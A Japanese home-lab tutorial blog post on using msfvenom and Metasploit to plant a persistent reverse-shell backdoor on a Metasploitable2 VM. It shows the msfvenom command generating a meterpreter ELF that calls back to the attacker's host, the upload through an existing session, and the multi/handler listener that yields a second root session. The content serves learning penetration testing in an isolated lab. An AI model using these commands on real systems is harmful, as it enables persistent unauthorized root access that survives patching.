---
title: "Metasploitとmsfvenomでバックドアを仕込んでみる"
date: 2026-09-16
tags: ["vulnerability", "エシカルハッキング", "Security", "metasploit", "msfvenom", "KaliLinux"]
source: "[[metasploit-msfvenom-backdoor]]"
---
MetasploitとMetasploitable VMを使ってバックドアを仕掛ける手順を学んでみたいと思います。
バックドアを仕込むことで、初期侵入経路がふさがれたとしても、別の方法で侵入出来るようにしていきたいと思います。
```
管理者が対策 → vsftpdを停止/パッチ適用
     ↓
元の侵入経路が使えなくなる
     ↓
でもバックドアがあれば再侵入可能
```

:::note warn
警告
本記事の内容は自宅ラボ内の隔離環境で、自分が所有・管理するMetasploitable2に対してのみ実施しています。
他人が管理するサーバやネットワークに対して同様の行為を行うことは不正アクセス禁止法などの法律に違反する可能性があります。本記事は学習・検証目的の共有であり、悪用を推奨するものではありません。
:::

## サイバーキルチェーンで見る本記事の位置づけ

今回の内容をサイバーキルチェーンの7段階に当てはめると、以下のように整理できます。

| 段階 | 内容 | 本記事での該当箇所 |
|---|---|---|
| ②武器化 | マルウェア作成 | msfvenomによるELF形式バックドアの生成 |
| ③配信 | 攻撃手段の送信 | 既存の侵入セッション経由での/tmpへのアップロード |
| ⑤インストール | バックドア設置 | 対象システム上でのバックドア実行 |
| ⑥C2/遠隔操作 | サーバーとの通信 | multi/handlerによるリスナー起動と新規セッション確立 |

![ハッキングの全体フロー図.jpeg](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3219385/7802ec5a-b298-4b6b-898d-26ac927b4a6c.jpeg)

# 環境構築
## バックドア用のファイル作成
metasploitでバックドア用のファイルを作成していきます。
msfvenomコマンドを使います。
```
# msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.0.25 LPORT=4444 -f elf -o backdoor
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 123 bytes
Final size of elf file: 207 bytes
Saved as: backdoor

# chmod +x backdoor 
# ls -ltr
合計 4
-rwxr-xr-x 1 root root 207  9月 15 20:19 backdoor

# cp backdoor /tmp/
```
msfvenomコマンドのオプションの意味

| 部分 | 値 | 意味 |
|------|---|------|
| `msfvenom` | - | Metasploitのペイロード生成ツール |
| `-p` | `linux/x86/meterpreter/reverse_tcp` | ペイロード（実行内容）の指定 |
| `LHOST` | `192.168.0.25` | 攻撃者（Kali）のIPアドレス（接続先） |
| `LPORT` | `4444` | 攻撃者側のポート番号（接続先ポート） |
| `-f` | `elf` | 出力ファイル形式（Linuxの実行ファイル形式） |
| `-o` | `backdoor` | 出力ファイル名 |

出力ファイル形式について

| 形式 | 説明 | 用途 |
|------|------|------|
| `elf` | Executable and Linkable Format | Linux/Unix実行ファイル |
| `exe` | Windows実行ファイル | Windows用 |
| `apk` | Android Package | Android用 |
| `vba` | Visual Basic for Applications | Officeマクロ |
| `pdf` | Portable Document Format | PDF文書 |

## バックドアを攻撃対象に仕込む
metasploit-frameworkで攻撃対象のサーバに先ほど作成したバックドアのファイルを仕込みます。
metasploit-frameworkでの侵入方法は以下を参照ください。

[[metasploit-intro]]

uploadコマンドがあるので、これを使って攻撃対象の/tmpディレクトリにアップロードしておきます。
```
meterpreter > upload /tmp/backdoor /tmp/backdoor
[*] Uploading  : /tmp/backdoor -> /tmp/backdoor
[*] Uploaded -1.00 B of 207.00 B (-0.48%): /tmp/backdoor -> /tmp/backdoor
[*] Completed  : /tmp/backdoor -> /tmp/backdoor
```

backdoorに実行権限を付与します。面倒だったので777で設定しておきます。
```
meterpreter > shell
Process 8619 created.
Channel 2 created.
ls -ltr /tmp
total 12
-rw------- 1 tomcat55 nogroup     0 Sep 15 04:22 5324.jsvc_up
drwx------ 2 msfadmin msfadmin 4096 Sep 15 06:25 orbit-msfadmin
drwx------ 2 msfadmin msfadmin 4096 Sep 15 06:25 gconfd-msfadmin
---------- 1 root     root      207 Sep 15 07:36 backdoor
chmod 777 /tmp/backdoor 
ls -ltr /tmp
total 12
-rw------- 1 tomcat55 nogroup     0 Sep 15 04:22 5324.jsvc_up
drwx------ 2 msfadmin msfadmin 4096 Sep 15 06:25 orbit-msfadmin
drwx------ 2 msfadmin msfadmin 4096 Sep 15 06:25 gconfd-msfadmin
-rwxrwxrwx 1 root     root      207 Sep 15 07:36 backdoor
```

## リスナーの設定とバックドア実行でセッションを張る
リスナーを設定していきます。
今の侵入状態をバックグラウンドに持っていき、kali側でリスナーを起動していきます。
eploit -jと実行することでバックグラウンドでジョブが実行されます。
```
meterpreter > background
[*] Backgrounding session 1...

sf exploit(unix/ftp/vsftpd_234_backdoor) > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf exploit(multi/handler) > set PAYLOAD linux/x86/meterpreter/reverse_tcp
PAYLOAD => linux/x86/meterpreter/reverse_tcp
msf exploit(multi/handler) > set LHOST 192.168.0.25
LHOST => 192.168.0.25
msf exploit(multi/handler) > set LPORT 4444
LPORT => 4444

msf exploit(multi/handler) > exploit -j
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.
msf exploit(multi/handler) > 
msf exploit(multi/handler) > 
[*] Started reverse TCP handler on 192.168.0.25:4444 
```

先程バックグランドに持っていったものをフォアグラウンドに戻し、侵入先でバックドアを実行していきます。
```
msf exploit(multi/handler) > sessions

Active sessions
===============

  Id  Name  Type                   Information                        Connection
  --  ----  ----                   -----------                        ----------
  1         meterpreter x86/linux  root @ metasploitable.localdomain  192.168.0.25:4444 -> 192.168.0.27:36958 (19
                                                                      2.168.0.27)

msf exploit(multi/handler) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > shell
Process 8728 created.
Channel 3 created.
/tmp/backdoor &
[*] Sending stage (1079144 bytes) to 192.168.0.27
[*] Meterpreter session 2 opened (192.168.0.25:4444 -> 192.168.0.27:49680) at 2026-09-15 21:29:09 +0900
exit
```

改めて現在の侵入状態をバックグラウンドに持って行って、kali側でsessionsコマンドを叩いて確認してみます。
IDが2のセッションがバックドアのセッションになります。
```
meterpreter > background
[*] Backgrounding session 1...
msf exploit(multi/handler) > sessions

Active sessions
===============

  Id  Name  Type                   Information                        Connection
  --  ----  ----                   -----------                        ----------
  1         meterpreter x86/linux  root @ metasploitable.localdomain  192.168.0.25:4444 -> 192.168.0.27:36958 (19
                                                                      2.168.0.27)
  2         meterpreter x86/linux  root @ metasploitable.localdomain  192.168.0.25:4444 -> 192.168.0.27:49680 (19
                                                                      2.168.0.27)
```

バックドア経由で侵入出来ることを確認します。
このようにバックドアを仕込んでおくことで初期経路がふさがれても侵入できる状態を維持できます。
```
msf exploit(multi/handler) > sessions -i 2
[*] Starting interaction with 2...

meterpreter > getuid
Server username: root
```

